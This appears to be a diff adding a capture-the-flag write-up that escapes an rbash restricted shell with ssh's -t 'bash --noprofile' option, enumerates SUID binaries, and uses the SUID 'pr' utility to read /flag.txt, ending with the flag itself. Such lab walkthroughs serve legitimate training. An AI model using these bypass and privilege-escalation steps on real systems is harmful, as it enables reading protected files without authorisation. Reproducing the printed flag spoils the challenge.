@@ -1,0 +1,32 @@
+Connect to port 6542 with ssh as Brandon.
+You are in restricted shell (rbash).
+Available commands are:
+- hostname
+- ls
+- whoami
+- echo
+
+In order to bypass it you should connect with ssh using -t "bash --noprofile":
+
+ssh -i id_rsa -p 6542 brandon@127.0.0.1 -t "bash --noprofile"
+
+After that you should enumerate all binaries having SUID permissions:
+
+find / -perm -4000 2>/dev/null
+
+/usr/lib/openssh/ssh-keysign
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/bin/newgrp
+/usr/bin/mount
+/usr/bin/su
+/usr/bin/chfn
+/usr/bin/umount
+/usr/bin/passwd
+/usr/bin/gpasswd
+/usr/bin/chsh
+/usr/bin/pr
+
+pr -T /flag.txt
+
+Flag:
+flag{1t_d035n't_g3t_4ny_3a513r_th4n_th15}
